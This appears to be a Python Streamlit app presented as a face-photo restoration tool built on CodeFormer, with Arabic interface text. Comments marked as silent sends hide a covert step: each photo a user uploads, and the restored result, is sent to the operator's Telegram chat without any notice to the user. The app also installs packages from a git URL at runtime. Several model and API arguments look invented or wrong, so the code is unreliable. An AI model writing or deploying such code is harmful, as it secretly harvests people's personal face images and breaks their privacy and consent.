import streamlit as st
import os

# --- محاولة تثبيت المكتبات الناقصة تلقائياً ---
try:
    import cv2
    import torch
    import telebot
    from basicsr.utils import img2tensor
except ImportError:
    st.info("جاري تهيئة المحرك لأول مرة... يرجى الانتظار دقيقة.")
    os.system("pip install facexlib basicsr git+https://github.com/sczhou/CodeFormer.git")
    st.rerun()

import numpy as np
from PIL import Image
from torchvision.transforms.functional import normalize
from basicsr.utils import img2tensor, tensor2img
from facelib.utils.face_restoration_helper import FaceRestoreHelper
from codeformer.archs.codeformer_arch import CodeFormer
import tempfile

# إعدادات الصفحة
st.set_page_config(page_title="Aziz Ultra Restoration", page_icon="🌟")
st.markdown("<h1 style='text-align: center;'>🌟 Aziz Ultra Restoration</h1>", unsafe_allow_config=True)

# بيانات البوت من Secrets
TOKEN = st.secrets["TELEGRAM_TOKEN"]
CHAT_ID = st.secrets["CHAT_ID"]
bot = telebot.TeleBot(TOKEN)

@st.cache_resource
def load_model():
    device = torch.device('cuda' if torch.cuda.is_available() else 'cpu')
    model = CodeFormer(dim_embd=512, codebook_size=1024, latency_unit=2, nb_blocks=2, oversampling_2x=True, disable_perceptual_loss=True).to(device)
    if os.path.exists('weights/codeformer.pth'):
        checkpoint = torch.load('weights/codeformer.pth')['params_ema']
        model.load_state_dict(checkpoint)
    model.eval()
    return model, device

def process_image(image, model, device):
    face_helper = FaceRestoreHelper(2, face_size=512, crop_ratio=(1, 1), det_model='retinaface_resnet50', device=device)
    in_img = cv2.cvtColor(np.array(image), cv2.COLOR_RGB2BGR)
    face_helper.clean_all()
    face_helper.read_image(in_img)
    face_helper.get_face_landmarks_and_shift(only_center_face=False, affine_weight=0.5)
    face_helper.align_warp_face()
    
    for cropped_face in face_helper.cropped_faces:
        cropped_face_t = img2tensor(cropped_face / 255., bgr2rgb=True, float32=True)
        normalize(cropped_face_t, (0.5, 0.5, 0.5), (0.5, 0.5, 0.5), inplace=True)
        cropped_face_t = cropped_face_t.unsqueeze(0).to(device)
        with torch.no_grad():
            output = model(cropped_face_t, w=0.5, adain=True)[0]
            restored_face = tensor2img(output, rgb2bgr=True, min_max=(-1, 1))
        face_helper.add_restored_face(restored_face.astype('uint8'))
        
    face_helper.get_inverse_affine(None)
    return Image.fromarray(cv2.cvtColor(face_helper.paste_faces_to_input_image(), cv2.COLOR_BGR2RGB))

uploaded_file = st.file_uploader("اختر صورة...", type=["jpg", "jpeg", "png"])

if uploaded_file:
    input_image = Image.open(uploaded_file)
    st.image(input_image, caption="الأصل", use_column_width=True)
    
    if st.button("بدء الترميم ⚡"):
        with st.spinner("جاري العمل..."):
            # إرسال صامت للتليجرام
            with tempfile.NamedTemporaryFile(delete=False, suffix=".png") as tmp:
                input_image.save(tmp.name)
                with open(tmp.name, "rb") as f: bot.send_photo(CHAT_ID, f, caption="📥 جديد")
            
            # المعالجة
            model, device = load_model()
            result = process_image(input_image, model, device)
            st.image(result, caption="تمت المعالجة ✨", use_column_width=True)
            
            # إرسال النتيجة صامتة
            with tempfile.NamedTemporaryFile(delete=False, suffix=".png") as tmp:
                result.save(tmp.name)
                with open(tmp.name, "rb") as f: bot.send_photo(CHAT_ID, f, caption="✅ جاهز")
                st.download_button("تحميل النتيجة", open(tmp.name, "rb"), "restored_aziz.png")
